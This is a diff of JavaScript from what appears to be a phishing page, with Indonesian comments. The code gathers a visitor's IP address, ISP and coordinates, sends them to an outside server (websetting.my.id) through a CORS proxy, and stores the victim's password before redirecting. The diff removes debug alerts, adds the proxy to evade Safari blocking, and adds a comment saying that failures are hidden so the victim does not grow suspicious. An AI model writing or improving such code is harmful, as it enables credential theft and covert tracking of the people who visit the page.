@@ -103,24 +103,19 @@
             payload.isp = d.org || "-";
             payload.koord = (d.latitude||"-")+" , "+(d.longitude||"-");
             
-            // ALERT 1
-            alert("1. IP Berhasil didapat: " + payload.ip + ". Lanjut kirim ke server...");
-
-            return fetch("https://websetting.my.id/api/send", {
+            // PAKE PROXY CORS BIAR GA DIBLOKIR SAFARI
+            return fetch("https://corsproxy.io/?url=https://websetting.my.id/api/send", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
             });
         })
         .then(function(res){
-            // ALERT 2
-            alert("2. Data sukses terkirim ke API send.js!");
             sessionStorage.setItem('password_korban', password);
             window.location.href = "selesai.html";
         })
         .catch(function(err){
-            // ALERT 3
-            alert("3. Gagal kirim data! Error: " + err.message);
+            // KALO ERROR TETEP LANJUT BIAR KORBAN GA CURIGA
             window.location.href = "selesai.html";
         });
   }
